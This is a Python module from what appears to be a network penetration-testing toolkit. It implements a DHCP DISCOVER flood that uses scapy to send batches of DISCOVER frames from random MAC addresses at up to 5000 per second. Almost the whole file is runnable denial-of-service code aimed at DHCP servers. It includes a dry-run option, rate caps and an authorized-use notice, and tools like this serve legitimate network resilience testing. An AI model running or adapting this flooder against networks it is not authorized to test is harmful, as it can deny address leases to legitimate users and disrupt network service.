"""DHCP discover flooding: send a high rate of DHCPDISCOVER messages from random clients.

A DHCP server must process every DISCOVER and decide whether to offer an address. A
flood of DISCOVERs from random client MACs, with no REQUEST and no lease, keeps the
server busy and fills its logs and its offer state, without leasing any address. The
effect to measure is the rate the server receives, and whether a legitimate client
still gets an offer while the flood runs.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.common import random_mac
from macabre.attacks.dhcp_starvation import build_discover

MAX_RATE = 5000.0
BATCH_SECONDS = 0.1


@dataclass(frozen=True)
class DiscoverFloodConfig:
    iface: str                  # attacker interface, on the segment with the server
    rate: float = 200.0         # DISCOVERs per second
    count: int = 0              # DISCOVERs to send in total; 0 = run until stopped
    dry_run: bool = False

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} DISCOVERs per second.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class DiscoverFloodStats:
    frames: int = 0
    status: str = ""


def run_discover_flooding(
    config: DiscoverFloodConfig,
    stop_event: threading.Event,
    on_progress: Callable[[DiscoverFloodStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> DiscoverFloodStats:
    """Send DISCOVERs from random client MACs at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = DiscoverFloodStats(
            status=f"Dry run: would send about {config.rate:g} DHCPDISCOVER per second from random clients. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = DiscoverFloodStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        frames = [build_discover(random_mac(rng), rng.getrandbits(32)) for _ in range(batch)]
        send(frames, iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
